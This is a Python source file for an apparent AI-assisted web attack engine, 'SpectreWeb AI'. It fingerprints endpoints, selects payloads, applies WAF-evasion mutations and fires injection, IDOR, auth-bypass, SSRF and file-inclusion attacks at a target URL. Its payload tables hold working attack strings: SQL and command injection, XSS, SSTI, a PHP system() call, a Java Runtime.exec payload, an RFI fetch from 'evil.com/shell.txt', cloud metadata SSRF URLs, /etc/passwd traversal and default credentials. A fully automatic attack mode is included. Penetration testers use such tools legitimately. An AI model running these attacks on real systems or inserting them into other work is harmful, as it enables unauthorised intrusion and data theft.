#!/usr/bin/env python3
"""
SpectreWeb AI - Advanced Manual Attack Session Engine v1.0

A sophisticated orchestration engine for manual penetration testing that:
- Maintains stateful attack sessions with context
- Uses AI-driven endpoint fingerprinting and payload selection
- Implements auto-escalation based on response analysis
- Supports chained attacks with dependency management
- Provides real-time progress and intelligent suggestions

This is the "co-pilot" for manual testing - you control direction, AI suggests tactics.
"""

import sys
import re
import json
import time
import threading
import secrets
from typing import Dict, Any, List, Optional, Tuple, Callable
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from urllib.parse import urlparse, parse_qs, urlencode
import concurrent.futures

from .client import make_request
from .manual_testing import (
    build_request, send_request, replay_with_modifications,
    mutate_payload, generate_polyglot, generate_waf_bypass_payloads,
    diff_responses, extract_secrets_from_response, analyze_error_response,
    generate_idor_tests, generate_privilege_escalation_tests, generate_auth_bypass_tests,
    suggest_next_tests, WAF_BYPASS_HEADERS
)
from .payloads import (
    XSS_PAYLOADS as COMMON_XSS_PAYLOADS,
    SQLI_PAYLOADS as COMMON_SQLI_PAYLOADS,
    LFI_PAYLOADS as COMMON_LFI_PAYLOADS,
    SSRF_PAYLOADS as COMMON_SSRF_PAYLOADS,
)


# ============================================================================
# ENUMS & DATA CLASSES
# ============================================================================

class AttackPhase(Enum):
    """Phases of an attack session"""
    RECON = "recon"
    FINGERPRINT = "fingerprint"
    DISCOVERY = "discovery"
    EXPLOITATION = "exploitation"
    POST_EXPLOIT = "post_exploit"


class EndpointType(Enum):
    """Classification of endpoint types"""
    AUTH = "authentication"
    API = "api"
    FILE = "file_operation"
    SEARCH = "search"
    ADMIN = "admin"
    PAYMENT = "payment"
    USER_DATA = "user_data"
    UPLOAD = "upload"
    REDIRECT = "redirect"
    UNKNOWN = "unknown"


class VulnCategory(Enum):
    """Vulnerability categories for testing"""
    INJECTION = "injection"
    AUTH = "authentication"
    ACCESS_CONTROL = "access_control"
    BUSINESS_LOGIC = "business_logic"
    SSRF = "ssrf"
    FILE_INCLUSION = "file_inclusion"
    DISCLOSURE = "information_disclosure"


@dataclass
class AttackResult:
    """Result of a single attack attempt"""
    attack_id: str
    timestamp: str
    target_url: str
    method: str
    payload: str
    payload_type: str
    status_code: int
    response_length: int
    response_time: float
    interesting: bool
    findings: List[str]
    evidence: str = ""
    severity: str = "info"
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class SessionState:
    """State of an attack session"""
    session_id: str
    target: str
    started_at: str
    current_phase: AttackPhase
    endpoint_type: EndpointType
    baseline_response: Dict = field(default_factory=dict)
    cookies: Dict = field(default_factory=dict)
    headers: Dict = field(default_factory=dict)
    discovered_params: List[str] = field(default_factory=list)
    findings: List[AttackResult] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    context: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "target": self.target,
            "started_at": self.started_at,
            "current_phase": self.current_phase.value,
            "endpoint_type": self.endpoint_type.value,
            "cookies": self.cookies,
            "headers": self.headers,
            "discovered_params": self.discovered_params,
            "findings_count": len(self.findings),
            "notes": self.notes,
        }


# ============================================================================
# ENDPOINT FINGERPRINTING
# ============================================================================

ENDPOINT_SIGNATURES = {
    EndpointType.AUTH: {
        "url_patterns": [r"/login", r"/auth", r"/signin", r"/token", r"/oauth", r"/session", r"/register", r"/signup"],
        "param_patterns": ["username", "password", "email", "user", "pass", "token", "code"],
        "response_patterns": ["login", "password", "authenticate", "credentials", "session", "jwt", "bearer"],
    },
    EndpointType.API: {
        "url_patterns": [r"/api/", r"/v\d+/", r"/graphql", r"/rest/", r"/json"],
        "param_patterns": ["api_key", "apikey", "access_token", "format"],
        "response_patterns": ["application/json", '"data"', '"error"', '"status"'],
    },
    EndpointType.FILE: {
        "url_patterns": [r"/upload", r"/download", r"/file", r"/document", r"/attachment", r"/media"],
        "param_patterns": ["file", "filename", "path", "document", "attachment", "dir"],
        "response_patterns": ["content-disposition", "octet-stream", "multipart"],
    },
    EndpointType.SEARCH: {
        "url_patterns": [r"/search", r"/query", r"/find", r"/filter", r"/lookup"],
        "param_patterns": ["q", "query", "search", "keyword", "term", "filter"],
        "response_patterns": ["results", "matches", "found", "hits"],
    },
    EndpointType.ADMIN: {
        "url_patterns": [r"/admin", r"/manage", r"/dashboard", r"/panel", r"/console", r"/backend"],
        "param_patterns": ["admin", "role", "permission"],
        "response_patterns": ["administrator", "management", "settings", "configuration"],
    },
    EndpointType.PAYMENT: {
        "url_patterns": [r"/payment", r"/checkout", r"/order", r"/cart", r"/transaction", r"/billing"],
        "param_patterns": ["amount", "price", "quantity", "card", "payment", "order_id"],
        "response_patterns": ["payment", "transaction", "order", "amount", "total", "currency"],
    },
    EndpointType.USER_DATA: {
        "url_patterns": [r"/user", r"/profile", r"/account", r"/settings", r"/me"],
        "param_patterns": ["user_id", "id", "uid", "account_id", "profile"],
        "response_patterns": ["user", "profile", "account", "email", "name"],
    },
    EndpointType.UPLOAD: {
        "url_patterns": [r"/upload", r"/import", r"/attach"],
        "param_patterns": ["file", "upload", "image", "document"],
        "response_patterns": ["uploaded", "file_id", "attachment"],
    },
    EndpointType.REDIRECT: {
        "url_patterns": [r"/redirect", r"/goto", r"/out", r"/link"],
        "param_patterns": ["url", "redirect", "return", "next", "goto", "target", "dest"],
        "response_patterns": [],
    },
}

VULN_MAPPING = {
    EndpointType.AUTH: [VulnCategory.AUTH, VulnCategory.INJECTION],
    EndpointType.API: [VulnCategory.INJECTION, VulnCategory.ACCESS_CONTROL, VulnCategory.DISCLOSURE],
    EndpointType.FILE: [VulnCategory.FILE_INCLUSION, VulnCategory.ACCESS_CONTROL],
    EndpointType.SEARCH: [VulnCategory.INJECTION, VulnCategory.DISCLOSURE],
    EndpointType.ADMIN: [VulnCategory.ACCESS_CONTROL, VulnCategory.AUTH],
    EndpointType.PAYMENT: [VulnCategory.BUSINESS_LOGIC, VulnCategory.ACCESS_CONTROL],
    EndpointType.USER_DATA: [VulnCategory.ACCESS_CONTROL, VulnCategory.INJECTION],
    EndpointType.UPLOAD: [VulnCategory.FILE_INCLUSION, VulnCategory.INJECTION],
    EndpointType.REDIRECT: [VulnCategory.SSRF],
}


def fingerprint_endpoint(url: str, response: Dict = None) -> Tuple[EndpointType, float, List[str]]:
    """
    Fingerprint an endpoint to determine its type and suggest attack vectors.
    
    Returns:
        (endpoint_type, confidence, reasons)
    """
    scores = {etype: 0.0 for etype in EndpointType}
    reasons = []
    parsed = urlparse(url)
    path = parsed.path.lower()
    params = list(parse_qs(parsed.query).keys())
    
    for etype, signatures in ENDPOINT_SIGNATURES.items():
        # Check URL patterns
        for pattern in signatures["url_patterns"]:
            if re.search(pattern, path, re.IGNORECASE):
                scores[etype] += 2.0
                reasons.append(f"URL matches {etype.value} pattern: {pattern}")
        
        # Check parameter patterns
        for param in params:
            if param.lower() in signatures["param_patterns"]:
                scores[etype] += 1.5
                reasons.append(f"Param '{param}' suggests {etype.value}")
        
        # Check response patterns if available
        if response:
            body = response.get("body", "").lower()
            headers = str(response.get("headers", {})).lower()
            content = body + headers
            
            for pattern in signatures["response_patterns"]:
                if pattern.lower() in content:
                    scores[etype] += 1.0
                    reasons.append(f"Response contains {etype.value} indicator: {pattern}")
    
    # Find best match
    best_type = max(scores, key=scores.get)
    confidence = min(1.0, scores[best_type] / 5.0)  # Normalize to 0-1
    
    if confidence < 0.2:
        best_type = EndpointType.UNKNOWN
    
    return best_type, round(confidence, 2), reasons


# ============================================================================
# SMART PAYLOAD ENGINE
# ============================================================================

class SmartPayloadEngine:
    """Context-aware payload generation and selection"""
    
    def __init__(self):
        self.payload_db = {
            VulnCategory.INJECTION: {
                "xss": COMMON_XSS_PAYLOADS[:20] if COMMON_XSS_PAYLOADS else self._default_xss(),
                "sqli": COMMON_SQLI_PAYLOADS[:20] if COMMON_SQLI_PAYLOADS else self._default_sqli(),
                "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}"],
                "nosql": ['{"$gt":""}', '{"$ne":""}', "'; return true; //"],
                "cmd": ["; id", "| id", "`id`", "$(id)", "&& id"],
            },
            VulnCategory.FILE_INCLUSION: {
                "lfi": COMMON_LFI_PAYLOADS[:15] if COMMON_LFI_PAYLOADS else self._default_lfi(),
                "rfi": ["http://evil.com/shell.txt", "//evil.com/shell"],
            },
            VulnCategory.SSRF: {
                "internal": COMMON_SSRF_PAYLOADS[:10] if COMMON_SSRF_PAYLOADS else self._default_ssrf(),
                "cloud_meta": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://169.254.169.254/metadata/instance",
                ],
            },
            VulnCategory.AUTH: {
                "bypass": ["' OR '1'='1", "admin'--", "' OR ''='"],
                "default_creds": [("admin", "admin"), ("admin", "password"), ("root", "root")],
            },
            VulnCategory.ACCESS_CONTROL: {
                "idor_numeric": ["-1", "0", "1", "9999999"],
                "idor_uuid": ["00000000-0000-0000-0000-000000000000"],
                "privesc_params": [("admin", "true"), ("role", "admin"), ("is_admin", "1")],
            },
            VulnCategory.BUSINESS_LOGIC: {
                "price_manipulation": ["-1", "0", "0.01", "999999999"],
                "quantity": ["-1", "0", "9999999", "1.5"],
                "race": ["concurrent_requests"],
            },
        }
    
    def _default_xss(self):
        return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'\"><svg/onload=alert(1)>"]
    
    def _default_sqli(self):
        return ["'", "\"", "' OR '1'='1", "1' AND '1'='1", "1 UNION SELECT NULL--"]
    
    def _default_lfi(self):
        return ["../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd%00"]
    
    def _default_ssrf(self):
        return ["http://127.0.0.1", "http://localhost", "http://[::1]"]
    
    def get_payloads_for_endpoint(
        self, 
        endpoint_type: EndpointType, 
        context: Dict = None,
        intensity: str = "medium"
    ) -> Dict[str, List[str]]:
        """
        Get contextually appropriate payloads for an endpoint type.
        
        Args:
            endpoint_type: Type of endpoint
            context: Additional context (tech stack, previous findings)
            intensity: "light", "medium", "heavy"
        """
        vulns = VULN_MAPPING.get(endpoint_type, [VulnCategory.INJECTION])
        payloads = {}
        
        # Multiplier for intensity
        mult = {"light": 0.3, "medium": 0.6, "heavy": 1.0}.get(intensity, 0.6)
        
        for vuln in vulns:
            if vuln in self.payload_db:
                for payload_type, payload_list in self.payload_db[vuln].items():
                    if isinstance(payload_list, list):
                        count = max(3, int(len(payload_list) * mult))
                        payloads[f"{vuln.value}_{payload_type}"] = payload_list[:count]
        
        # Add context-specific payloads
        if context:
            tech_stack = context.get("technologies", [])
            if any("php" in t.lower() for t in tech_stack):
                payloads["php_specific"] = ["<?php system('id'); ?>", "php://filter/convert.base64-encode/resource=index.php"]
            if any("java" in t.lower() for t in tech_stack):
                payloads["java_specific"] = ["${T(java.lang.Runtime).getRuntime().exec('id')}"]
            if any("node" in t.lower() or "express" in t.lower() for t in tech_stack):
                payloads["node_specific"] = ["{{constructor.constructor('return process')().exit()}}"]
        
        return payloads
    
    def mutate_for_waf_bypass(self, payload: str, level: int = 1) -> List[str]:
        """
        Generate WAF bypass variants of a payload.
        
        Level 1: Basic encoding
        Level 2: Advanced encoding + case manipulation
        Level 3: Full bypass techniques including null bytes, comments, etc.
        """
        mutations = [payload]
        
        if level >= 1:
            mutations.extend(mutate_payload(payload, ["encode"]))
        
        if level >= 2:
            mutations.extend(mutate_payload(payload, ["case", "encode", "double"]))
        
        if level >= 3:
            mutations.extend(mutate_payload(payload, ["case", "encode", "whitespace", "comments", "null", "double"]))
            # Add WAF-specific bypasses
            waf_bypasses = generate_waf_bypass_payloads(payload)
            mutations.extend([b["payload"] for b in waf_bypasses])
        
        # Dedupe
        return list(dict.fromkeys(mutations))


# ============================================================================
# ATTACK SESSION ENGINE
# ============================================================================

class AttackSession:
    """
    Advanced manual attack session with AI-driven orchestration.
    
    Usage:
        session = AttackSession("https://target.com/api/users")
        session.start()
        
        # Fingerprint and get suggestions
        suggestions = session.analyze_and_suggest()
        
        # Run specific attack
        results = session.run_attack("injection", param="id")
        
        # Get report
        report = session.get_report()
    """
    
    def __init__(self, target_url: str, auth_headers: Dict = None, cookies: Dict = None):
        self.target_url = target_url
        self.session_id = secrets.token_hex(8)  # 16-char hex string, cryptographically secure
        self.state = SessionState(
            session_id=self.session_id,
            target=target_url,
            started_at=datetime.now().isoformat(),
            current_phase=AttackPhase.RECON,
            endpoint_type=EndpointType.UNKNOWN,
            headers=auth_headers or {},
            cookies=cookies or {},
        )
        self.payload_engine = SmartPayloadEngine()
        self.lock = threading.Lock()
        self._attack_count = 0
    
    def _log(self, message: str):
        """Thread-safe logging"""
        print(f"[SESSION:{self.session_id[:6]}] {message}")
        sys.stdout.flush()
    
    def start(self) -> Dict[str, Any]:
        """
        Start the attack session by:
        1. Getting baseline response
        2. Fingerprinting endpoint
        3. Discovering parameters
        """
        self._log(f"Starting attack session on {self.target_url}")
        
        # Phase 1: Baseline
        self.state.current_phase = AttackPhase.RECON
        self._log("Phase 1: Getting baseline response...")
        
        baseline = make_request(
            self.target_url,
            headers=self.state.headers,
            cookies=self.state.cookies,
            timeout=30
        )
        self.state.baseline_response = baseline
        
        # Phase 2: Fingerprint
        self.state.current_phase = AttackPhase.FINGERPRINT
        self._log("Phase 2: Fingerprinting endpoint...")
        
        endpoint_type, confidence, reasons = fingerprint_endpoint(self.target_url, baseline)
        self.state.endpoint_type = endpoint_type
        self.state.context["fingerprint"] = {
            "type": endpoint_type.value,
            "confidence": confidence,
            "reasons": reasons
        }
        
        self._log(f"Endpoint identified as: {endpoint_type.value} (confidence: {confidence})")
        
        # Phase 3: Parameter Discovery
        self.state.current_phase = AttackPhase.DISCOVERY
        self._log("Phase 3: Discovering parameters...")
        
        parsed = urlparse(self.target_url)
        params = list(parse_qs(parsed.query).keys())
        self.state.discovered_params = params
        
        self._log(f"Found {len(params)} parameters: {params}")
        
        return {
            "success": True,
            "session_id": self.session_id,
            "baseline": {
                "status": baseline.get("status_code"),
                "length": baseline.get("body_length", 0),
            },
            "endpoint_type": endpoint_type.value,
            "confidence": confidence,
            "reasons": reasons,
            "discovered_params": params,
        }
    
    def analyze_and_suggest(self) -> Dict[str, Any]:
        """
        Analyze current state and suggest next attacks.
        
        Returns AI-driven suggestions based on:
        - Endpoint type
        - Discovered parameters
        - Previous findings
        - Response characteristics
        """
        suggestions = []
        priority_attacks = []
        
        endpoint_type = self.state.endpoint_type
        params = self.state.discovered_params
        baseline = self.state.baseline_response
        
        # Get relevant vulnerability categories
        vulns = VULN_MAPPING.get(endpoint_type, [VulnCategory.INJECTION])
        
        for vuln in vulns:
            if vuln == VulnCategory.INJECTION:
                if params:
                    priority_attacks.append({
                        "attack": "injection_test",
                        "params": params,
                        "reason": f"Test injection on {len(params)} parameters",
                        "priority": "high"
                    })
                suggestions.append("Test SQL injection with time-based payloads")
                suggestions.append("Test XSS in different contexts (HTML, attribute, JS)")
                suggestions.append("Test SSTI if template engine detected")
            
            elif vuln == VulnCategory.ACCESS_CONTROL:
                priority_attacks.append({
                    "attack": "idor_test",
                    "reason": "Endpoint handles user data - IDOR likely",
                    "priority": "high"
                })
                suggestions.append("Try accessing other users' resources by ID manipulation")
                suggestions.append("Test horizontal privilege escalation")
            
            elif vuln == VulnCategory.AUTH:
                priority_attacks.append({
                    "attack": "auth_bypass",
                    "reason": "Authentication endpoint detected",
                    "priority": "critical"
                })
                suggestions.append("Test SQL injection in login")
                suggestions.append("Try default credentials")
                suggestions.append("Test JWT manipulation if tokens used")
            
            elif vuln == VulnCategory.BUSINESS_LOGIC:
                priority_attacks.append({
                    "attack": "business_logic",
                    "reason": "Payment/transaction endpoint - logic flaws likely",
                    "priority": "high"
                })
                suggestions.append("Test price/amount manipulation")
                suggestions.append("Test race conditions on purchase")
                suggestions.append("Test negative quantities")
            
            elif vuln == VulnCategory.SSRF:
                suggestions.append("Test SSRF with internal IP targets")
                suggestions.append("Test cloud metadata endpoints")
                suggestions.append("Try DNS rebinding")
            
            elif vuln == VulnCategory.FILE_INCLUSION:
                priority_attacks.append({
                    "attack": "lfi_test",
                    "reason": "File operation endpoint detected",
                    "priority": "high"
                })
                suggestions.append("Test LFI with path traversal")
                suggestions.append("Test file upload bypass (if applicable)")
        
        # Analyze baseline for additional hints
        body = baseline.get("body", "").lower()
        if "error" in body or "exception" in body:
            suggestions.insert(0, "Verbose errors detected - try error-based injection")
        if "debug" in body:
            suggestions.insert(0, "Debug mode may be enabled - check for info disclosure")
        
        # Previous findings context
        if self.state.findings:
            interesting = [f for f in self.state.findings if f.interesting]
            if interesting:
                suggestions.insert(0, f"Found {len(interesting)} interesting responses - escalate testing on those parameters")
        
        return {
            "endpoint_type": endpoint_type.value,
            "priority_attacks": priority_attacks,
            "suggestions": suggestions[:10],
            "params_to_test": params,
            "recommended_intensity": "heavy" if endpoint_type in [EndpointType.AUTH, EndpointType.PAYMENT] else "medium"
        }
    
    def run_attack(
        self, 
        attack_type: str, 
        params: List[str] = None,
        custom_payloads: List[str] = None,
        intensity: str = "medium",
        waf_bypass_level: int = 1,
        max_requests: int = 100,
        injection_location: str = "query",
        body_template: Dict = None
    ) -> Dict[str, Any]:
        """
        Run a specific attack type against the target.
        
        Args:
            attack_type: "injection", "idor", "auth_bypass", "business_logic", "ssrf", "lfi"
            params: Parameters to test (defaults to discovered params)
            custom_payloads: Custom payloads to use
            intensity: "light", "medium", "heavy"
            waf_bypass_level: 0-3 for WAF bypass mutation level
            max_requests: Maximum requests to send
            injection_location: "query", "body", "json", "header" - where to inject payloads
            body_template: Template dict for JSON body injection (payload replaces value)
        """
        self.state.current_phase = AttackPhase.EXPLOITATION
        params = params or self.state.discovered_params
        
        if not params:
            return {"success": False, "error": "No parameters to test"}
        
        self._log(f"Running {attack_type} attack on {len(params)} params (intensity: {intensity})")
        
        # Get payloads based on attack type
        if custom_payloads:
            payloads = {"custom": custom_payloads}
        else:
            payloads = self._get_payloads_for_attack(attack_type, intensity)
        
        # Apply WAF bypass if needed
        if waf_bypass_level > 0:
            mutated_payloads = {}
            for ptype, plist in payloads.items():
                mutated = []
                for p in plist:
                    mutated.extend(self.payload_engine.mutate_for_waf_bypass(p, waf_bypass_level))
                mutated_payloads[ptype] = list(dict.fromkeys(mutated))[:max_requests // len(params)]
            payloads = mutated_payloads
        
        # Run attacks
        results = []
        interesting_count = 0
        request_count = 0
        baseline_length = self.state.baseline_response.get("body_length", 0)
        baseline_status = self.state.baseline_response.get("status_code", 200)
        
        total_tests = sum(len(plist) * len(params) for plist in payloads.values())
        self._log(f"Total tests: {min(total_tests, max_requests)} (location: {injection_location})")
        
        attack_start_time = time.time()
        
        for payload_type, payload_list in payloads.items():
            for param in params:
                for payload in payload_list:
                    if request_count >= max_requests:
                        break
                    
                    request_count += 1
                    if request_count % 10 == 0:
                        elapsed = time.time() - attack_start_time
                        rate = request_count / elapsed if elapsed > 0 else 0
                        self._log(f"Progress: {request_count}/{min(total_tests, max_requests)} - Interesting: {interesting_count} - Rate: {rate:.1f} req/s")
                    
                    # Build and send request with injection location support
                    result = self._test_payload(
                        param, payload, payload_type, 
                        baseline_length, baseline_status,
                        injection_location=injection_location,
                        body_template=body_template
                    )
                    results.append(result)
                    
                    # ====== SELF-LEARNING: Record attack to LearningStore ======
                    try:
                        from core.learning_store import record_attack
                        tech_stack = self.state.context.get("technologies", [])
                        record_attack(
                            target_url=self.target_url,
                            endpoint_type=self.state.endpoint_type.value if self.state.endpoint_type else "unknown",
                            tech_stack=tech_stack,
                            attack_type=attack_type,
                            payload=payload,
                            payload_type=payload_type,
                            status_code=result.status_code,
                            response_length=result.response_length,
                            response_time=result.response_time,
                            interesting=result.interesting,
                            findings=result.findings,
                            severity=result.severity,
                            injection_location=injection_location,
                            waf_bypass_level=waf_bypass_level
                        )
                    except Exception:
                        pass  # Don't break attacks if learning store fails
                    
                    if result.interesting:
                        interesting_count += 1
                        self.state.findings.append(result)
                        self._log(f"[FOUND] {result.findings[0] if result.findings else 'Interesting response'}")
        
        attack_elapsed = time.time() - attack_start_time
        self._log(f"Attack complete: {request_count} requests, {interesting_count} interesting in {attack_elapsed:.1f}s")
        
        return {
            "success": True,
            "attack_type": attack_type,
            "injection_location": injection_location,
            "total_requests": request_count,
            "max_requests": max_requests,
            "interesting_count": interesting_count,
            "results": [r.to_dict() for r in results if r.interesting],
            "all_results_count": len(results),
            "elapsed_seconds": round(attack_elapsed, 2),
            "requests_per_second": round(request_count / attack_elapsed, 2) if attack_elapsed > 0 else 0
        }
    
    def _get_payloads_for_attack(self, attack_type: str, intensity: str) -> Dict[str, List[str]]:
        """Get payloads based on attack type"""
        mapping = {
            "injection": VulnCategory.INJECTION,
            "idor": VulnCategory.ACCESS_CONTROL,
            "auth_bypass": VulnCategory.AUTH,
            "business_logic": VulnCategory.BUSINESS_LOGIC,
            "ssrf": VulnCategory.SSRF,
            "lfi": VulnCategory.FILE_INCLUSION,
        }
        
        vuln = mapping.get(attack_type, VulnCategory.INJECTION)
        
        # Get from payload engine
        all_payloads = self.payload_engine.get_payloads_for_endpoint(
            self.state.endpoint_type,
            self.state.context,
            intensity
        )
        
        # Filter by attack type
        relevant = {}
        for key, plist in all_payloads.items():
            if vuln.value in key or attack_type in key:
                relevant[key] = plist
        
        return relevant if relevant else all_payloads
    
    def _test_payload(
        self, 
        param: str, 
        payload: str, 
        payload_type: str,
        baseline_length: int,
        baseline_status: int,
        injection_location: str = "query",
        body_template: Dict = None
    ) -> AttackResult:
        """
        Test a single payload and analyze response.
        
        Supports injection in:
        - query: URL query parameters
        - body: Form data body
        - json: JSON body (uses body_template)
        - header: HTTP headers
        """
        self._attack_count += 1
        attack_id = f"{self.session_id}-{self._attack_count}"
        
        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        method = "GET"
        request_data = None
        request_headers = dict(self.state.headers)
        test_url = self.target_url
        
        # Build request based on injection location
        if injection_location == "query":
            # Inject in query parameters
            params = parse_qs(parsed.query)
            params[param] = [payload]
            test_url = f"{base_url}?{urlencode(params, doseq=True)}"
            method = "GET"
            
        elif injection_location == "body":
            # Inject in form body (POST)
            method = "POST"
            request_data = {param: payload}
            request_headers["Content-Type"] = "application/x-www-form-urlencoded"
            
        elif injection_location == "json":
            # Inject in JSON body
            method = "POST"
            if body_template:
                # Deep copy and inject
                json_body = json.loads(json.dumps(body_template))
                json_body[param] = payload
            else:
                json_body = {param: payload}
            request_data = json.dumps(json_body)
            request_headers["Content-Type"] = "application/json"
            
        elif injection_location == "header":
            # Inject in HTTP header
            request_headers[param] = payload
            method = "GET"
        
        start_time = time.time()
        try:
            response = make_request(
                test_url,
                method=method,
                headers=request_headers,
                data=request_data,
                cookies=self.state.cookies,
                timeout=30
            )
        except Exception as e:
            return AttackResult(
                attack_id=attack_id,
                timestamp=datetime.now().isoformat(),
                target_url=test_url,
                method=method,
                payload=payload,
                payload_type=payload_type,
                status_code=0,
                response_length=0,
                response_time=0,
                interesting=False,
                findings=[f"Request failed: {e}"],
                severity="info"
            )
        
        elapsed = time.time() - start_time
        status = response.get("status_code", 0)
        length = response.get("body_length", 0)
        body = response.get("body", "")
        
        # Analyze for interesting indicators
        interesting = False
        findings = []
        severity = "info"
        evidence = ""
        
        # Status change
        if status != baseline_status:
            interesting = True
            findings.append(f"Status changed: {baseline_status} -> {status}")
            if status == 500:
                severity = "medium"
                findings.append("Server error - possible injection point")
        
        # Significant length change
        length_diff = abs(length - baseline_length)
        if length_diff > 100:
            interesting = True
            findings.append(f"Length changed: {baseline_length} -> {length} (diff: {length_diff})")
        
        # Time-based detection
        if elapsed > 5.0 and "sleep" in payload.lower() or "waitfor" in payload.lower():
            interesting = True
            severity = "high"
            findings.append(f"Time-based injection detected: {elapsed:.2f}s response time")
        
        # Reflection detection
        if payload in body:
            interesting = True
            findings.append("Payload reflected in response")
            evidence = body[body.find(payload):body.find(payload)+200]
            
            # Check if unencoded
            if "<" in payload and "<" in body:
                severity = "high"
                findings.append("Possible XSS - unencoded reflection")
        
        # Error message detection
        error_patterns = [
            (r"SQL syntax", "SQL error detected", "high"),
            (r"mysql_fetch", "MySQL error", "high"),
            (r"ORA-\d{5}", "Oracle error", "high"),
            (r"PostgreSQL", "PostgreSQL error", "high"),
            (r"syntax error", "Syntax error exposed", "medium"),
            (r"stack trace", "Stack trace exposed", "medium"),
            (r"Exception", "Exception exposed", "medium"),
            (r"\/etc\/passwd", "LFI successful", "critical"),
            (r"root:x:0:0", "LFI successful - /etc/passwd", "critical"),
        ]
        
        for pattern, message, sev in error_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                interesting = True
                findings.append(message)
                if severity != "critical":
                    severity = sev
        
        return AttackResult(
            attack_id=attack_id,
            timestamp=datetime.now().isoformat(),
            target_url=test_url,
            method=method,
            payload=payload,
            payload_type=payload_type,
            status_code=status,
            response_length=length,
            response_time=round(elapsed, 3),
            interesting=interesting,
            findings=findings,
            evidence=evidence[:500] if evidence else "",
            severity=severity
        )
    
    def run_idor_test(self, id_param: str, current_value: str) -> Dict[str, Any]:
        """
        Specialized IDOR testing with smart value generation.
        """
        self._log(f"Running IDOR test on param: {id_param}")
        
        test_values = generate_idor_tests(current_value)
        results = []
        
        baseline = self.state.baseline_response
        baseline_length = baseline.get("body_length", 0)
        
        for test in test_values:
            result = self._test_payload(
                id_param, 
                test["value"], 
                f"idor_{test['type']}",
                baseline_length,
                baseline.get("status_code", 200)
            )
            results.append(result)
            
            if result.interesting:
                self._log(f"[IDOR] Interesting: {test['type']} = {test['value']}")
        
        return {
            "success": True,
            "param": id_param,
            "original_value": current_value,
            "tests_run": len(test_values),
            "interesting": [r.to_dict() for r in results if r.interesting]
        }
    
    def run_auth_bypass_test(self, endpoint: str = None) -> Dict[str, Any]:
        """
        Run comprehensive auth bypass tests.
        """
        endpoint = endpoint or self.target_url
        self._log(f"Running auth bypass test on: {endpoint}")
        
        tests = generate_auth_bypass_tests(endpoint)
        results = []
        
        for test in tests[:30]:  # Limit tests
            if test["type"] == "method_override":
                resp = make_request(
                    endpoint,
                    method=test["method"],
                    headers=self.state.headers,
                    cookies=self.state.cookies,
                    timeout=15
                )
            elif test["type"] == "header_bypass":
                headers = {**self.state.headers, **test["headers"]}
                resp = make_request(
                    endpoint,
                    headers=headers,
                    cookies=self.state.cookies,
                    timeout=15
                )
            elif test["type"] == "path_manipulation":
                resp = make_request(
                    test["path"],
                    headers=self.state.headers,
                    cookies=self.state.cookies,
                    timeout=15
                )
            else:
                continue
            
            baseline_status = self.state.baseline_response.get("status_code", 403)
            status = resp.get("status_code", 0)
            
            result = {
                "test": test,
                "status": status,
                "interesting": status != baseline_status and status in [200, 201, 302]
            }
            results.append(result)
            
            if result["interesting"]:
                self._log(f"[AUTH BYPASS] {test['description']} -> Status: {status}")
        
        return {
            "success": True,
            "tests_run": len(results),
            "bypasses_found": [r for r in results if r["interesting"]]
        }
    
    def get_report(self) -> Dict[str, Any]:
        """Generate comprehensive session report"""
        findings = self.state.findings
        
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in findings:
            if f.severity in severity_counts:
                severity_counts[f.severity] += 1
        
        return {
            "session_id": self.session_id,
            "target": self.target_url,
            "started_at": self.state.started_at,
            "endpoint_type": self.state.endpoint_type.value,
            "parameters_tested": self.state.discovered_params,
            "total_attacks": self._attack_count,
            "findings_summary": {
                "total": len(findings),
                "by_severity": severity_counts,
            },
            "findings": [f.to_dict() for f in findings],
            "notes": self.state.notes,
            "recommendations": suggest_next_tests([{"type": f.payload_type} for f in findings])
        }
    
    def add_note(self, note: str):
        """Add a note to the session"""
        self.state.notes.append(f"[{datetime.now().isoformat()}] {note}")


# ============================================================================
# CONVENIENCE FUNCTIONS
# ============================================================================

def create_attack_session(
    url: str, 
    auth_headers: Dict = None, 
    cookies: Dict = None
) -> Dict[str, Any]:
    """Create and initialize an attack session"""
    session = AttackSession(url, auth_headers, cookies)
    result = session.start()
    
    # Store session for later retrieval
    now = time.time()
    with _active_sessions_lock:
        _cleanup_expired_sessions(now)
        _active_sessions[session.session_id] = session
        _active_sessions_created_at[session.session_id] = now
        _active_sessions_last_access[session.session_id] = now
    
    return result


def get_session(session_id: str) -> Optional[AttackSession]:
    """Retrieve an active session by ID"""
    now = time.time()
    with _active_sessions_lock:
        _cleanup_expired_sessions(now)
        session = _active_sessions.get(session_id)
        if session is not None:
            _active_sessions_last_access[session_id] = now
        return session


def run_quick_attack(
    url: str,
    attack_types: List[str] = None,
    intensity: str = "medium"
) -> Dict[str, Any]:
    """
    Run a quick attack session without manual intervention.
    
    Args:
        url: Target URL
        attack_types: List of attack types to run (default: injection, idor)
        intensity: "light", "medium", "heavy"
    """
    attack_types = attack_types or ["injection", "idor"]
    
    session = AttackSession(url)
    session.start()
    
    suggestions = session.analyze_and_suggest()
    
    all_results = []
    for attack_type in attack_types:
        result = session.run_attack(attack_type, intensity=intensity, max_requests=50)
        all_results.append(result)
    
    report = session.get_report()
    report["suggestions"] = suggestions
    report["attack_results"] = all_results
    
    return report


# Session storage
_ACTIVE_SESSION_TTL_SECONDS = 60 * 60
_active_sessions: Dict[str, AttackSession] = {}
_active_sessions_created_at: Dict[str, float] = {}
_active_sessions_last_access: Dict[str, float] = {}
_active_sessions_lock = threading.Lock()

def _cleanup_expired_sessions(now: Optional[float] = None):
    now = time.time() if now is None else now
    expired_ids = [
        sid for sid, last in _active_sessions_last_access.items()
        if (now - last) > _ACTIVE_SESSION_TTL_SECONDS
    ]
    for sid in expired_ids:
        _active_sessions.pop(sid, None)
        _active_sessions_created_at.pop(sid, None)
        _active_sessions_last_access.pop(sid, None)
